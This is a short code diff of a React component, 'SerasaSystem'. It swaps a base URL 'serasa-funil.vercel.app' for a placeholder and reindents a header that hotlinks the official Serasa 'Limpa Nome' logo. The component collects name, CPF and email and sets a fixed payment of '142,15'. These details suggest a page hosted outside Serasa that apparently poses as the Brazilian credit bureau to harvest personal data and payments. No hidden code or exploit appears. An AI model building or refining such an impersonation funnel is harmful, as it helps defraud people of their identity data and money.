@@ -21,7 +21,7 @@ const SerasaSystem = () => {
   const [newLead, setNewLead] = useState({ name: '', cpf: '', email: '' });
 
   const FINAL_PAYMENT = "142,15";
-const BASE_URL = "https://serasa-funil.vercel.app"; // URL atualizada conforme fornecido
+  const BASE_URL = "https://seu-site-vercel.app"; // Altere para sua URL da Vercel
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -73,8 +73,8 @@ const BASE_URL = "https://serasa-funil.vercel.app"; // URL atualizada conforme f
       <div className="max-w-7xl mx-auto flex items-center justify-between">
         <div className="flex items-center gap-4">
           <button className="p-2 hover:bg-white/20 rounded-full transition-colors"><Menu size={24} /></button>
-           <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" className="h-8 w-auto" />
-          </div>
+          <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" className="h-8 w-auto" />
+        </div>
         <button className="flex items-center gap-2 text-sm font-medium bg-white/10 px-4 py-2 rounded-full hover:bg-white/20 transition-all">
           <User size={18} /> <span>Entrar</span>
         </button>
